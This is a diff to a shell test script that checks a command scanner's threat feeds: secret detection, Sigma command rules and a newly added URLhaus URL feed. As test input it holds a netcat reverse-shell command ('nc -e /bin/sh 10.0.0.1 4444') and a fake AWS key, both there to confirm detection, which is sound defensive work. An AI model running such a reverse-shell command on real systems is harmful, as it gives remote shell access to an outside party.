@@ -32,6 +32,10 @@ FS="$("$SHIM" feeds status </dev/null 2>&1)"; printf '%s' "$FS" | grep -q "NOT o
 "$SHIM" feeds scan 'export AWS_SECRET=AKIAZZ7XQ2BR4TSTKEYA' </dev/null 2>&1 | grep -q "aws-access-token" && ok "feeds scan finds an AWS key" || no "feeds scan missed the AWS key"
 [ -f "$HOME/.blitz/feeds/commands/rules.json" ] && ok "opt-in also installed the commands feed (Sigma, $(grep -o '"rules":[0-9]*' "$HOME/.blitz/feeds/commands/manifest.json"))" || no "commands feed missing"
 "$SHIM" feeds scan 'nc -e /bin/sh 10.0.0.1 4444' </dev/null 2>&1 | grep -q "Netcat Reverse Shell" && ok "feeds scan flags a reverse shell (Sigma)" || no "Sigma scan missed the reverse shell"
+[ -f "$HOME/.blitz/feeds/urls/rules.json" ] && ok "opt-in also installed the urls feed (URLhaus, $(grep -o '"rules":[0-9]*' "$HOME/.blitz/feeds/urls/manifest.json") URLs)" || no "urls feed missing"
+LISTED="$(grep -v '^#' "$HOME/.blitz/feeds/urls/source.raw" | head -1)"
+"$SHIM" feeds scan "echo $LISTED" </dev/null 2>&1 | grep -q "URLhaus" && ok "feeds scan flags a listed URL ($LISTED)" || no "URL scan missed $LISTED"
+"$SHIM" feeds scan 'curl https://raw.githubusercontent.com/oven-sh/bun/main/README.md' </dev/null 2>&1 | grep -q "nothing flagged" && ok "a GitHub raw URL is not host-blocked (shared platform)" || no "shared platform host was flagged"
 "$SHIM" feeds opt-out </dev/null >/dev/null 2>&1 && [ ! -e "$HOME/.blitz/feeds/opt-in" ] && [ -f "$HOME/.blitz/feeds/secrets/rules.json" ] && ok "opt-out keeps files, drops consent" || no "opt-out state wrong"
 
 echo "== run it (no PATH, no bun on PATH, from a foreign cwd)"
